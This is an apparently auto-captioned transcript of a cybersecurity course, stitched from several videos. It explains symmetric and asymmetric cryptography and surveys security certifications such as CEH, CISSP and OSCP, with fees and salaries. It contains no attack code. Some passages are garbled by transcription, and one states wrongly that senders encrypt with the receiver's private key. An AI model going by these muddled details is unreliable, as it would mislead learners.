can find our correct credentials
if any website had asked for a payment
information or a legitimate credentials
it would have been really easy to get a
hold of these
to reiterate what we have already
learned we must always avoid http
websites and just unknown or not
trustworthy websites in general because
the problem we saw here is just the tip
of the iceberg even though cryptography
has managed to lessen the risk of cyber
attacks it is still prevalent and we
should always be alert to keep ourselves
safe online
there are two types of encryption in
cryptography
symmetric cryptography
and asymmetric key cryptography
both of these categories have their pros
and cons and differ only by the
implementation
today we are going to focus exclusively
on symmetry key cryptography
let us have a look at its applications
in order to understand its importance
better
this variant of cryptography is
primarily used in banking applications
where personally identifiable
information needs to be encrypted
with so many aspects of banking moving
on to the internet having a reliable
safety net is crucial
symmetric cryptography helps in
detecting bank fraud and boosts the
security index of these payment gateways
in general
they are also helpful in protecting data
that is not in transit and dress on
servers and data centers
these centers house a massive amount of
data that needs to be encrypted with a
fast and efficient algorithm so that
when the data needs to be recalled by
the respective service there is the
assurance of minor to no delay
while browsing the internet we need
symmetric encryption to browse secure
https websites so that we get an
all-around protection it plays a
significant role in verifying website
server authenticity exchanging the
necessary encryption keys required and
generating a session using those keys to
ensure maximum security
this helps us in preventing the rather
insecure hdp website format
so let us understand how symmetric key
cryptography works first before moving
on to the specific algorithms
symmetric key cryptography relies on a
single key for the encryption and
decryption of information
both the sender and receiver of the
message need to have a pre-shared secret
key that they will use to convert the
plain text into ciphertext and vice
versa
as you can see in the image the key used
for encryption is the same key needed
for decrypting the message at the other
end the secret key shouldn't be sent
along with the cipher text to the
receiver because that would defeat the
entire purpose of using cryptography key
exchange can be done beforehand using
other algorithms like the diffie-hellman
key exchange protocol for example
for example if paul wants to send a
simple message to jane they need to have
a single encryption key that both of
them must keep secret to prevent
snooping on by malicious actors
it can be generated by either one of
them but must belong to both of them
before the messages start flowing
suppose the message i am ready is
converted into ciphertext using a
specific substitution cipher by paul in
that case jane must also be aware of the
substitution shift to decrypt the
ciphertext once it reaches her
irrespective of the scenario where
someone manages to grab the ciphertext
mid-transit to try and read the message
not having the secret key renders
everyone helpless looking to snoop in
the symmetric key algorithms like the
data encryption standard have been in
use since the 1970s while the popular
ones like the ees have become the
industry standard today
with the entire architecture of
symmetric cryptography depending on the
single key being used you can understand
why it's of paramount importance to keep
it secret on all occasions
the side effect of having a single key
for the encryption and decryption is it
becomes a single point of failure anyone
who gets their hand on it can read all
the encrypted messages and do so mainly
without the knowledge of the sender and
the receiver
so it is the priority to keep the
encryption and encryption key private at
all times
should it fall into the wrong hands the
third party can send messages to either
the sender or the receiver using the
same key to encrypt the message upon
receiving the message and decrypting it
with the key it is impossible to guess
its origin
if the sender somehow transmits the
secret key along with the cipher text
anyone can intercept the package and
access the information
consequently this encryption category is
termed private key cryptography since a
big part of the data's integrity is
riding on the promise that the users can
keep the key secret this terminology
contrasts with asymmetry key
cryptography which is called public key
cryptography because it has two
different keys at play one of which is
public
provided we managed to keep the key
secret we still have to choose what kind
of ciphers we want to use to encrypt
this information in symmetric key
cryptography there are broadly two
categories of ciphers that we can employ
let us have a look
stream ciphers are the algorithms that
encode basic information one bit at a
time
it can change depending on the algorithm
being used but usually it relies on a
single bit or byte to do the encryption
this is the relatively quicker
alternative considering the algorithm
doesn't have to deal with blocks of data
at a single time
every piece of data that goes into the
encryption can and needs to be converted
into binary format in stream ciphers
each binary digit is encrypted one after
the other
the most popular ones are the rc4 salsa
and panama
the binary data is passed through an
encryption key which is a randomly
generated bit stream
upon passing it through we receive the
ciphertext that can be transferred to
the receiver without fear of
man-in-the-middle attacks
the binary data can be passed through an
algorithmic function
it can have either x or operations as it
is most of the time or any other
mathematical calculations that have the
singular purpose of scrambling the data
the encryption key is generated using
the random bitstream generator and it
acts as a supplement in the algorithmic
function the output is in binary form
which is then converted into the decimal
or hexadecimal format to give our final
ciphertext
on the other hand block ciphers dissect
the raw information into chunks of data
of fixed size
the size of these blocks depend on the
exact cipher being used a 128-bit block
cipher will break the plain text into
blocks of 128 bit each and encrypt those
blocks instead of a single digit once
these blocks are encrypted individually
they are chained together to form a
final cipher text
block ciphers are much slower but they
are more tamper-proof and are used in
some of the most widely used algorithms
employed today
just like stream ciphers the original
ciphertext is converted into binary
format before beginning the process
once the conversion is complete the
blocks are passed through the encryption
algorithm along with the encryption key
this would provide us
with the encrypted blocks of binary data
once these blocks are combined we get a
final binary string
this string is then converted into
hexadecimal format to get a ciphertext
today the most popular symmetric key
algorithms like aes des and 3des are all
block cipher methodology subsets
with so many factors coming into play
there are quite a few things
symmetrically cryptography excels at
while falling short in some other
symmetric key cryptography is much
faster variant when compared to
asymmetric key cryptography there is
only one key in play unlike asymmetric
encryption and this drastically improves
calculation speed in the encryption and
decryption
similarly the performance of symmetric
encryption is much more efficient under
similar computational limitations fewer
calculations help in better memory
management for the whole system
bulk amounts of data that need to be
encrypted are very well suited for
symmetric algorithms since they are much
quicker handling large amounts of data
is simple and easy to use in servers and
data forms this helps in better latency
during data recall and fewer mixed
packets
thanks to its simple single key
structure symmetric key cryptography
algorithms are much easier to set up a
communication channel with and offer a
much more straightforward maintenance
duties once the secret key is
transmitted to both the sender and
receiver without any prior mishandling
the rest of the system aligns easily and
everyday communications becomes easy and
secure if the algorithm is applied as
per the documentation symmetric
algorithms are very robust and can
encrypt vast amounts of data with very
less overhead in a last video on
cryptography we took a look at symmetric
key cryptography
we used a single private key for both
the encryption and decryption of data
and it works very well in theory
let's take a look at a more realistic
scenario now
let's meet joe
joe is a journalist who needs to
communicate with ryan via long distance
messaging
due to the critical nature of the
information people are waiting for any
message to leave joe's house so that
they can intercept it
now joe can easily use symmetric
cryptography to send the encrypted data
so that even if someone intercepts the
message they cannot understand what it
says
but here's the tricky part
how will joe send the required
decryption key to ryan
the sender of the message as well as the
receiver need to have the same
decryption key so that they can exchange
messages otherwise ryan cannot decrypt
the information even when he receives
the cipher text if someone intercepts
the key while transmitting it there is
no use in employing cryptography since a
third party can now decode all the
information easily
key sharing is a risk that will always
exist when symmetric key cryptography is
being used
thankfully asymmetric key encryption has
managed to fix this problem
let's understand what asymmetric key
cryptography is
asymmetric encryption uses a double
layer of protection
there are two different keys at play
here a private key and a public key
a public key is used to encrypt the
information pre-transit and a private
key is used to decrypt the data post
transit
these pair of keys must belong to the
receiver of the message
the public keys can be shared via
messaging blog posts or key servers and
there are no restrictions as you can see
in the image the two keys are working in
the system
the sender first encrypts the message
using the receiver's private key after
which we receive the cipher text
the cipher text is then transmitted to
the receiver without any other key on
getting the ciphertext the receiver uses
his private key to decrypt it and get
the plain text back
there has been no requirement of any key
exchange throughout this process
therefore solving the most glaring flaw
faced in symmetric key cryptography
the public key known to everyone cannot
be used to decrypt the message and the
private key which can decrypt the
message need not be shared with anyone
the sender and receiver can exchange
personal data using the same set of keys
as often as possible
to understand this better take the
analogy of your mailbox
anyone who wants to send you a letter
has access to the box and can easily
share information with you
in a way you can say the mailbox is
publicly available to all but only you
have access to the key that can open the
mailbox and read the letters in it
this is how the private key comes to
play
no one can intercept the message and
read its contents since it's encrypted
once the receiver gets its contents he
can use his private key to decrypt the
information
both the public key and the private key
are generated so they are interlinked
and you cannot substitute other private
keys to decrypt the data
in another example if alice wants to
send a message to bob
let's say it reads call me today she
must use bob's public key while
encrypting the message
upon receiving the cipher message bob
can proceed to use his private key in
order to decrypt the message
and hence complete securities attained
during transmission without any need for
sharing the key
since this type of encryption is highly
secure it has many uses in areas that
require high confidentiality
it is used to manage digital signature
so there is valid proof of a document's
authenticity
with so many aspects of business
transitioning to the digital sphere
critical documents need to be verified
before being considered authentic and
acted upon
thanks to asymmetric cryptography
senders can now sign documents with
their private keys
anyone who needs to verify the
authenticity of such signatures can use
the sender's public key to decrypt the
signature
since the public and the private keys
are linked to each other mathematically
it's impossible to repeat this
verification wizard with duplicate keys
document encryption has been made very
simple by today's standards but the
background implementation follows the
similar approach
in blockchain architecture asymmetry key
cryptography is used to authorize
transactions and maintain the system
thanks to its two key structures changes
are reflected across the blockchain's
peer-to-peer network only if it is
approved from both ends
along with asymmetric key cryptography's
tamper-proof architecture its
non-repudiation characteristic also
helps in keeping the network stable
we can also use asymmetric key
cryptography combined with symmetrical
cryptography to monitor ssl or tls
encrypted browsing sessions to make sure
nobody can steal our personal
information when accessing banking
websites or the internet in general
it plays a significant role in verifying
website server authenticity exchanging
the necessary encryption keys required
and generating a session using those
keys to ensure maximum security instead
of the rather insecure http website
format security parameters differ on a
session by session basis so the
verification process is consistent and
utterly essential to modern data
security
another great use of the asymmetric key
cryptography structure is transmitting
keys for symmetric key cryptography with
the most significant difficulty in
symmetric encryption being key exchange
asymmetric keys can help clear the
shortcoming the original message is
first encrypted using a symmetric key
the key used for encrypting the data is
then converted into the ciphertext using
the receiver's public key
now we have two ciphertext to transmit
to the receiver on receiving both of
them the receiver uses his private key
to decrypt the symmetry key he can then
use it to decrypt the original
information on getting the key used to
encrypt the data
while this may seem more complicated
than just asymmetric cryptography alone
symmetric encryption algorithms are much
more optimized for vast amounts of data
on some occasions
encrypting the key using asymmetric
algorithms will definitely be more
memory efficient and secure
you might remember us discussing why
symmetric encryption was called private
key cryptography
let us understand why asymmetric falls
under the public key cryptography
we have two keys at our disposal
the encryption key is available to
everyone
the decryption key is supposed to be
private
unlike symmetric key cryptography there
is no need to share anything privately
to have an encrypted messaging system to
put that into perspective we share an
email address with anyone looking to
communicate with us it is supposed to be
public by design so that our email login
credentials are private and they help in
preventing any data mishandling
since there is nothing hidden from the
world if they want to send us any
encrypted information this category is
called the public key cryptography
there are quite a few algorithms being
used today that follow the architecture
of asymmetric cryptography none more
famous than the rs encryption
rsa encryption is the most widely used
encryption or public key encryption
standard using asymmetric approach named
after its founders rivest shamir and
edelman it uses block ciphers to obscure
the information
if you are unfamiliar with how block
ciphers work there are encryption
algorithms that divide the original data
into blocks of equal size
the block size depends on the exact
cipher being used once they are broken
down these blocks are encrypted
individually and later chained together
to form the final cipher text
widely considered to be the most
secure form of encryption albeit
relatively slower than symmetric
encryption algorithms it is widely used
in web browsing secure identification
vpns emails and other chat applications
with so many variables in play there
must be some advantages that give
asymmetrically cryptography an edge over
the traditional symmetric encryption
methodologies
let's go through some of them
there is no need for any reliable key
sharing channel in asymmetric encryption
it was an added risk in private key
cryptography that has been completely
eliminated in public key architecture
the key which is made public cannot
recruit any confidential information and
the only key that can decrypt doesn't
need to be shared publicly under any
circumstance
we have much more extensive key lengths
in rsa encryption and other asymmetric
algorithms like 2048 bits key and
4096-bit keys larger keys are much
harder to break into via brute force and
are much more secure
asymmetric key cryptography can use as a
proof of authenticity since only the
rightful owner of the keys can generate
the messages to be decrypted by the
private key the situation can also be
reversed encryption is done using a
private key and decryption is done by
the public key which would not function
if the correct private key is not used
to generate the message hence proving
the authenticity of the owner
it also has a tamper protection feature
where the message cannot be intercepted
and changed without invalidating the
private key used to encrypt the data
consequently the public key cannot
decrypt the message and it is easy to
realize the information is not 100
legitimate when and where the case
requires
so importance of a cyber security
certification first and foremost when i
see a certification i look at it from
three different aspects the first is the
training itself which allows me to gain
the knowledge which allows me to
understand the aspects of security or
whatever the certification is there for
the second aspect is the exam itself how
do i need to prepare myself for the exam
and how do i need to approach the exam
how do i need to ensure that i pass in
my first attempt and the third aspect is
the certification itself which allows me
to be eligible to apply for a particular
job rule so obtaining a cyber security
certification ensures or shows uh to the
organization that you're applying to
that you do have that prerequisite
knowledge and you should be shortlisted
for an interview the knowledge that you
have gained during the training will
help you when you attend that interview
and when you attempt to answer the
questions asked to you so these
certifications are designed for a
specific role uh for example a forensic
investigation certificate will teach you
how to investigate a crime scene
forensically a digital crime scene for a
matter of fact a certified ethical
hacking course will teach you about
penetration testing so it is you who's
going to decide which certification you
require and then attempt get certified
on it of course a fresher with a cyber
security certification will have better
employment opportunities because they
can showcase their knowledge with the
certification that they already have
even professionals who want to enhance
their careers can get into managerial or
advanced certifications to improve on
their knowledge and get promoted in
their job profiles so cyber security
cringe certifications can be classified
in three different aspects the first one
being the foundational level then the
managerial level and the advanced level
in the previous video we just had a
small overview here we are going to
discuss about what the certification
covers how the exams are conducted and
the price points for each and every exam
so let's start with the foundational
certifications we start off with ccna
which is the basic certification for
networking so the ccna routing and
switching certification basically it
helps you build your networking career
you will join an organization as a
networking engineer where you can help
the organization establish the routing
uh the pathing of how data packets will
travel across the network this
certification covers all the basic
concepts that you require to understand
networking the basic requirements for
this certification are that the
candidate must have a bachelor's degree
but apart from that there are no other
prerequisites so it's just that you need
a bachelor's degree and then you can
apply uh you can study for this you can
undergo a training and then you can
attempt the exam uh the certification
provider obviously is cisco so the
knowledge that is limited to this
training and certification is for cisco
devices only the exam fees for this
certification is approximately 325
dollars the exam when it is conducted it
has around 50 to 60 odd questions which
need to be answered in 19 minutes the
type of questions that you are going to
get is multiple choice questions where
you have a question and four answers and
you have to choose the correct answers
among those drag and drop where you have
to click on an object and drag it to its
appropriate place probably a
architectural diagram and you have to
let's say pick on a router and place it
into a particular position if you place
it correctly you answer the
answer the question correctly otherwise
it's wrong and a simulator where you
where there could be a configuration you
need to configure it in a particular
manner and then check whether the
configuration is correct or not the pass
mark is around 800 to 850 out of a
possible thousand marks so each question
will have a different weightage
depending on the depth of the question
depending on the difficult level of the
question or the difficulty level of the
question which uh would then count
towards your marks and if you score 800
to 850 that's when you clear the exam
the job roles as we have discussed over
here would be more more on the network
administrator side or a network engineer
side depending on the level of
experience that you have the salaries
that are expected from these job roles
in the us are around fifty five thousand
dollars to ninety thousand dollars
annually the next one is the comcha
certification called security plus comm
share is also a global certification
authority for infosec courses so this
certification teaches candidates on how
to secure applications networks and
devices it focuses on hands-on practical
skills in the field of network security
i have trained people on this
certification myself so i know this
certification is quite hands-on it deals
with the concepts to the core it helps
you understand the concepts and then in
the practical hands-on demo you need to
execute the practical yourself so that
you can gain that knowledge the
recommended level for a candidate to
attempt this training would be at least
around two years of experience in the
iit sector in addition if you have
already been certified for network plus
certification from comchia which is the
baseline networking certification this
is also a preferred way to go for this
certification as said kamcha is the
certificate provider and the exam fees
for this certification is 339 dollars
the exam is quite simple 90 questions in
90 minutes that's one minute per
question it sounds like a lot of time
but believe me the questions can be a
little bit confusing can be a little bit
lengthy so you will require all those 90
minutes to answer those questions
especially when they're tricky and
they're technical in nature the
questions would be multiple choice and
performance based the past mark for this
exam is around 750 points out of a
possible 900. the job profiles for this
kind of a certification is when you want
to apply for a security analyst position
or a security engineer's position where
you're going to analyze some data to
understand and figure out what problems
are ongoing in the organization uh the
average annual salary of this person
would be around 72 000
then comes the ceh or the certified
ethical hacker training from ec council
now this is a very well-known course and
also uh ac council is a global
certifying authority very well accepted
across a lot of countries uh this is an
offensive certification so here you're
basically trying to become a penetration
tester you're taught how to hack you're
taught how to attack a particular
organization from an ethical hacker's
perspective so the job profiles that
you'll be looking here are of a pen
tester where you go into an organization
you test their security controls or you
test their devices find out flaws within
them and then provide recommendations of
how to plug those flaws or mitigate
those flaws and improve the security of
that organization it is recommended that
you have two years of experience at
least in networking or security for
these uh to attempt this kind of
trainings and certifications again a
basic understanding of networking maybe
a little bit of applications operating
systems would be necessary before
attempting this certification the
certification provider is ec council and
the exam fees for this certification is
so the exam here would be 125 questions
which needs to be attempted in four
hours and you will only get multiple
choice questions in here now for ceh
there are two exams one is the multiple
choice questions and the second is a
practical exam where you need to solve
some given problems to you in a ilab
scenario and if you are able to solve
them properly you then get certified for
ceh practical the cutoff varies from 65
to 85 percent depending on the questions
that you have answered and the weightage
associated with each and every question
as said the job roles would be as a
penetration tester a security engineer
and your salaries would start from
around 90 000 annually then comes the
cnd or the certified network defender
also from ec council now this is more on
the network defense side so here again
the job rules would be where you're
where there's a network that you have
and you're going to try to secure the
network and the communications that are
going to travel over the network so you
need to be a network administrator
network security engineer or
in a similar profile to understand how
networks work and then you're going to
attempt to secure those networks the
certificate provider again is ec council
and the certification is placed a little
bit below ceh so it becomes network
defense then ceh where you're going to
become a penetration tester the exam
fees for this certification is 350 us
dollars the exam the exam is of 100
questions to be answered in four hours
again it's just a multiple choice
questions so you get a question with
four options you answer the correct one
and you move on to the next question the
past percentage again varies from 60 to
85 percent depending on the questions
answered and the weightage of that
question job rules to be applied network
defense technician cnd analyst or a
security analyst from a network
perspective salaries would range from 65
000 to 75 000 per annum then comes the
forensic investigator course which is
exactly what it is digital forensic
investigator this will help you
understand how computers work where data
is stored and how you can retrieve that
data to investigate a crime that has
taken place so the candidate must have
at least two years of experience in the
information security sector they need a
good understanding of how networks work
how computers work how operating systems
work how they store data
the location where that data is stored
how databases work how those databases
store those data and so on and so forth
this certification is sought after
mainly in the law enforcement areas but
there are a few corporates that offer
forensic investigation as a service
especially when a corporate gets
compromised and they want to
conduct their own investigations the
certification provider for this is also
ec council and the exam fees are 500
this is an advanced level certification
so uh understanding of applications
networks and operating systems is a must
before you attend this the exam is quite
similar 150 questions in four hours
again it's just a multiple choice
question exam the cutoff again is from
60 to 85 percent depending on the
questions and the weightage of each and
every question job rules i.t security
specialist network security pro the job
roles forensic investigators law
enforcement agencies security
specialists homeland security jobs and
your salaries would be around 88 000 and
above all right now let's talk about the
managerial level certifications kobit
stands for control objectives for
information and related technologies
it's a certification that will give a
candidate an in-depth knowledge of the
framework for which cobit is all about
and the framework helps you manage and
govern enterprise id environments now
this is advanced certification so around
eight years of managerial experience is
suggested before you attempt the core
with five certification to understand
all the aspects and to help you
implement the framework properly the
certification certificate provider is
asaka the exam fees are around 175
dollars now this is a small exam 50
questions but in 40 minutes so you
really have to be on your toes you have
to know the knowledge there's a very
limited time to think and you have to be
fast in your answers the past percentage
is 50 percent the job rules associated
with this certification would be to uh
when you apply for a information
security manager or as a security
consultant or a cyber security manager
and your roles and responsibilities
would be to govern and it space that the
organization owns so all the servers
desktops the network the data flows the
databases everything and how it needs to
be managed and how it needs to be
governed in a secure manner annual
salaries would be around a hundred
thousand dollars plus then the cism also
called as cism it stands for certified
information security manager and as the
name suggests it's a security manager
certification it helps the candidate in
understanding the relationship between
business goals and information security
so now you're going into the space where
you're not only technically in nature
but you also have to understand the
business needs the goals of the business
and you have to align the information
security of your infrastructure along
with the business needs and the business
goals so it is your inputs that are
going to go to the management to see if
the infrastructure is aligned to the
business goals or if the infrastructure
or the business goals need any fine
tuning around five years of work
experience is recommended in the
information security field for
attempting the cism out of the five
years the candidate must have a
background as an information security
manager for three years so you have some
experience as a manager uh you have
implemented those things yourselves
which will give you a better
understanding and then you attempt the
certification again providing by asaka
and the exam fees for asaka members is
for non-members it is 760 dollars the
exam is where you have to answer 150
questions in four hours uh quite a bit
of time but questions are going to be uh
scenario-based questions where they're
going to give you a lot of scenarios you
have to think about it and you have to
give the most probable and the correct
answer for that particular scenario the
past mark is 450 out of 800. your job
profiles would be either a risk manager
or a risk consultant analyzing the
business requirements to the
infrastructure security that that you
have and to identify if there any risks
associated with the infrastructure
highlight those risks and then put in
security controls and manage those
controls in a way where security is
mitigated your average salaries would be
around 88 000 and above then the cisa or
the cisa the certified information
systems auditor certification it not
only looks into security but it also
looks into auditing and controls in
information systems this is a highly
reputed certificate and you gain a
better understanding of governance
regulations and auditing your
information landscape again a minimum of
five years of work work experience in
the field of information systems
auditing control or security is
necessary now here the question would be
what's the difference security is where
you're technical in nature you have done
let's say a vulnerability assessment or
a penetration test you have implemented
firewalls you have architected security
controls are all about the security
controls that you're going to implement
like firewalls idss ips's data loss
prevention systems uh maybe even
utms and whatnot so experience in
architecting or implementing those
controls in an effective manner
mitigating your security or your your
vulnerabilities that you have identified
in the organization and auditing would
basically mean about looking at
compliance to ensure that
everything is in place you're compliant
with let's say iso 27001 guidelines or
the policies that you have created
yourself and everything is working in
order so it's more of a checklist where
you're going to just check everything is
in place and you're conforming to
standards this certification is also
provided by isaka and the exam fees for
isaka members are 575 dollars whereas
non asaka members will have to pay 760
dollars for the certification 150
questions again in four hours multiple
choice questions scenario based so you
have to really understand this uh real
world scenarios of where what controls
and what audit mechanisms should be in
place pass mark is 450 out of 800. your
job roles would be mainly becoming an
auditor or a senior auditor a director
for information security information
audit manager or information technology
consultant where you provide
intelligence on how the company should
implement their infrastructure average
salaries would be 103 000 and above then
comes the crisc also called as krisk
certified in risk and information
systems control certification helps the
candidate design and maintain
information systems controls for an
organization this is one of the most
sought after certifications as far as
risk management is concerned in europe
and in us if you have this kind of
certifications you automatically qualify
for a risk manager or a security risk
manager or a information security
consultant kind of a role you should
have a minimum of three years of
experience in the field of is controls
that means information security controls
you should have knowledge about
firewalls you should know about how to
mitigate risks how to identify risks in
the first place risk analysis risk
management and after which you're going
to implement security controls to
mitigate that risk or bring it to
acceptable levels at this point in time
you will also be responsible to create
policies revolving those risks and how
you want to calculate those risks and
treat those risks in their lifetime
certificate provider again is asaka 575
dollars for isaka members 760 dollars
for non-asaka members for the exam fees
a similar question 150 questions to be
answered in four hours multiple choice
based on performances so they may give
you a scenario where you have to perform
a risk analysis and provide a report and
a solution based on your findings again
the past mark is 450 out of 800. the job
profiles associated as discussed earlier
are the it risk management professionals
where they're going to identify risks
treat those risks calculate analyze
maybe do a business impact analysis to
ascertain how the organization is going
to be affected and then you will also be
looking at compliances as far as these
job roles are concerned average annual
salary would be 119 000 and above moving
on to advanced level certification
now this is where we come across the
cissp or the cis certification certified
information system security professional
this is the gold standard of all
certifications if you have this
certificate it's you can basically be
assured of a job in the id world now
just to qualify you'll have to have five
years of experience in the information
security field there are eight domains
that are specified by cissp and you have
to prove that you have knowledge and
your work experience of around five
years in at least two of those two means
if you do not have those kind of
experiences you can still attempt the
exam but you become an associate of isc
square which means that you get six
years to accomplish the five years of
experience requirement for this
certification before taking up the
certification we suggested that the
candidate clears all the intermediate
level certifications not all but some of
them in fact i have seen people do the
other way around they qualify for cissp
they give the exam once your cissp the
csa or see some cis or cism exams are
way easier to crack but you need to have
that kind of experience i have seen
people with 15 years of experience and
more
fail at this certification in the first
attempt the certificate provider is isc
square the exam fees is 699 dollars like
i said this certification is most sought
after the gold standard in fact there is
hardly any other certifications after
this that you might want to do the
questions now the exam has changed if it
is the english version that you're
giving it's 150 questions to be answered
in three hours if it is the non-english
exam that you're attempting then it is
250 questions in six hours it's a
marathon and if you're opting for the
six hour exam you need to plan it really
well it sounds really easy but the
questions are quite tough they're
scenario based and the answers are quite
confusing as well you would get multiple
choice questions you would get drag and
drop and you might get simulators as
well uh the past mark is 700 out of 1000
but each question has a different
weightage so
it depends on which questions are asked
of you and which questions you have
answered correctly the job rules
associated with this certification would
be anything and everything in
information security at the managerial
level and above so information security
manager risk manager system uh
information system security officer the
cso role the ciso chief information
security officer any role that you might
think of as a risk from a risk
compliance strategy could be achievable
after this kind of a certification the
average annual salary is hundred and
eight thousand dollars for this
certification so to be an ethical hacker
you must hold a certification which
specializes in ethical hacking or in
cyber security companies look for
candidates who are globally certified
when we say globally certified they're
looking for a certificate that has been
given by an organization that is
recognized globally and is well accepted
in the industry so these are the top
five certifications our candidate can
obtain the first one become a certified
ethical hacker then there is global
information assurance certification
penetration tester then offensive
security certified professional comptria
pentest plus and finally the license
penetration tester now these
certifications are offered by different
organizations all of these organizations
are recognized globally and their
certifications are well accepted in the
technical space so let's start off with
the certified ethical hacker and we'll
look at the organizations that provide
these certifications and how we can
attain them so ceh or certified ethical
hacker in its current form is in its
version 10 it's been revised and updated
over a period of time ec council is the
certifying authority for ceh they have
their own authorized training centers
through which you can attend trainings
give those exams get yourself certified
and thus become globally certified and
can be eligible to apply for security
related jobs it is a very well known
certification and is widely accepted at
the same time it would test the
candidates knowledge of security threats
and preventive measures now there are
two types of exams that you can give
with ceh one is a multiple choice
question exam which is theoretical in
nature they ask you questions and you
answer the correct uh you select the
correct answers if you clear you get
certified the second certification
nowadays is where there's a practical
exam associated with it that's a you'll
have to purchase the voucher for that
exam and give that exam the practical
exam is held in a virtual lab where they
you're given scenarios and based on
those scenarios you have to resolve the
questions given to you and give proof of
the resolution which would then
get you certified as an ethical hacker
the theoretical exam in this scenario is
the fees is around 500
this is for the multiple choice question
exam
where you can pay the fees and you can
attend through a
online portal and you can give the exam
directly the exam is four hours long in
which you have to answer 125 questions
now four hours for 125 questions seems a
long time but it isn't it's a very
technical exam there are scenario based
questions and it would take some time
for you to analyze and understand the
question and then identify the
equivalent correct answer so it's a very
competitive exam and you'll have to
study really hard to clear this exam as
well the cutoff for passing varies from
60 to 85 percent so there is no exact
grade and all the questions have
different weightages so depending on the
questions that have been given to you
and the way that you have answered them
you would pass at either 60
or you would pass when you scored 85
percent once you are ceh certified which
is a very technical certification you
will be qualified to apply for job roles
as a penetration tester or a security
engineer these are job roles where you
would be responsible of ethically trying
to attack applications
servers switches and try to find out
vulnerabilities within them the training
of this certification will make you
adept in most of these tools that are
required there are a lot of practicals
in this training and if you successfully
completed those practicals clearing the
exam is a easy task with the practicals
comes your knowledge and would help you
understand how you would be performing
penetration tests in the real world an
average annual salary in the usa for a
cea certified person is around 91 000
dollars and in india is around four like
seventy six thousand odd rupees the
salaries would vary as far as
organizations are concerned uh more
established organizations can afford to
pay a little bit more but these are
average salaries that we have seen
across the market the next certification
is the g pen also known as the global
information assurance certification
penetration tester this certification
looks into the different pen testing
practices and methods also focuses on
the various problems and pen testing so
again this is where you're getting
certified as a penetration tester so
it's again a technical certification
where your knowledge on networking
applications and security of which would
be tested you will be trained on this of
course so the training will include all
these areas where you need to focus
identify those problems and thus be
ready for the real world scenarios the
candidate will have to understand
networking concepts and operating
systems such as linux and windows and
you should be very well aware of the tcp
protocols this is true for any of the
technical certifications for ethical
hacking giac is the certification
provider it's again a very well renowned
and well accepted certification
authority across the globe the exam fees
are 1899
82 215 questions to be answered in three
hours now why 82 215 it depends on the
test that has been associated and
depending on how you're answering those
questions uh you would be given those
many number of questions to begin with
but all of these need to be answered in
three hours 74 is the past percentage
that is required to clear this exam the
average annual salary in the usa is
around 96 000
while in india it is around similar to
certified ethical hacking then looking
at the next certification from offensive
security called the oscp offensive
security certified professional this is
another penetration testing
certification highly technical in nature
and it is an entirely hands-on
certification the previous two
certifications that we saw we talked
about ceh where there are two different
exams you could either take the
theoretical exam and give your mcqs or
you could take the practical one here
you don't have an option this is a
practical exam so the test is conducted
on a virtual network so they send out
instructions to you there's a virtual
lab that is given out to you and they
give you the questions and you have to
perform those assessments create those
reports and provide it to the certifying
authority in this case offensive
security uh if you match their criterias
of whatever you have identified in those
reports you get certified here the
requirements of good understanding of
networking protocols how systems
function how kali linux operating system
functions and the candidate must for
complete offensive securities
penetration testing with the kali linux
course and pass the hands-on exam so
this focuses purely on kali linux kali
linux is an operating system that is
freely distributed over the internet and
comes structured with around 300 plus
tools used for ethical hacking so this
course totally relies on kali linux for
you to use as a tool set for penetration
testing the certificate provider as
stated is offensive security the name of
the course is oscp offensive security
certified professional exam is around
800 to
1550. now understand that this exam is
technical and is hands-on so for you to
prepare for this exam they come up with
virtual labs where you can start
practicing and honing your skills
depending on the number of days for
which you have purchased the access to
that particular labs the amount will
vary from 800 which would be the minimum
access days available to one thousand
five hundred and fifty dollars where the
maximum number of days would be given to
you for practicing once you are ready
even during the time spa time span of
where you have that access once you are
ready for the exam you can they can
attempt the exam and clear the average
annual salary is similar around 91 000
for the u.s market and 905 000 rupees in
the indian market then looking at the
comptia compchia pentest plus comptia is
another certification authority or a
certification provider a training
provider that that will help you get
yourself certified in the ethical
hacking space so they have certification
called pentest plus which is focused
towards penetration testing so it is an
intermediate level certification it
assesses the vulnerability assessment
and the penetration testing skills of a
candidate here the training will provide
you with all the essentials where it
will help you identify how to do
vulnerability assessments how to
identify those vulnerabilities and then
which tools to utilize for what kind of
a penetration test for the requirements
a minimum of three to four years of
hands-on experience in the information
security field also a comptia security
plus or a network plus or equivalent
knowledge is required so in the network
plus they talk about securing networks
and they help you understand the osi
layers the tcp layers and help you
understand the protocols and all of
those things so having that knowledge is
an added advantage the certificate
provider is comptia and the cost of the
exam is around 349
maximum number of questions
is 85 and i think it's a three hour exam
the passing percentage is uh scoring 750
marks out of a possible 900. so the
scale is the minimum you can ever score
is 100 if you're completely unbe
prepared the maximum you can score is
900. uh you get a leeway of 150 marks
for your uh certifications so you have
to score a minimum of 750 to clear the
exam average annual salary for your
hampshire certified penetration test
plus professional is 97 000 in the u.s
market and in the indian market it would
be around 5 lakh rupees then comes the
license penetration tester now this is
an advanced certificate again from ec
council this is where ec council gives
you a license which certifies that you
have undergone thorough training and
have cleared your exam in which you can
conduct or lead a audit for
vulnerability assessment and penetration
testing it is an expert level
certification comes after the ceh
certification it is the ultimate test
which tests this candidate's penetration
testing skills so there are two
certifications over here one is the ecsa
ec council certified security analyst
once you clear that you get you can
appear for the license penetration
tester both of these are hands-on
certifications so you will be given a
virtual lab you will be given a scenario
in which you have to perform some
assessments create reports submit it to
the ec council they will analyze your
reports if they meet the criterias that
have been identified you would then be
certified as a licensed penetration
tester the candidate must be above 18
years of age a recertification is
required every three years so the
validity is three years after three
years you will have to be recertified or
there is a continuing point education
system over there where you can score
points by publishing articles by
attending trainings or giving out
trainings any carrying areas are free
certified it is preferred that the
candidate has ceh and the ecsa
certification so the previous
certification that we saw certified
ethical hacker and then the ecsa ec
council certified security analyst after
which you can appear for the lpt license
penetration tester the certificate
provider again is ec council the license
penetration tester exam has a different
process the candidate must purchase an
exam dashboard for 899 which is valid
for a year so once you purchase the
voucher the validity is one year uh you
can prepare within that one year and
then give the exam and attain the
certification only once you're ready the
exam can be scheduled and you can give
that exam the exam consists of three
different levels each level has three
different challenges the candidate must
pass at least one challenge in order to
qualify for the next level and for each
level the exam is six hours so this is a
grueling exam this is hands-on they're
giving you challenges and they are going
to test you on your skills as a
penetration tester so be ready to be
very hands-on for this kind of a
certification average annual salary in
the u.s is around hundred thousand
dollars and above and in india 825 000
and above in today's world data is
generated in exchange at a high speed
did you know that 2.5 quintillion bytes
of data are generated every day
companies all over the world make
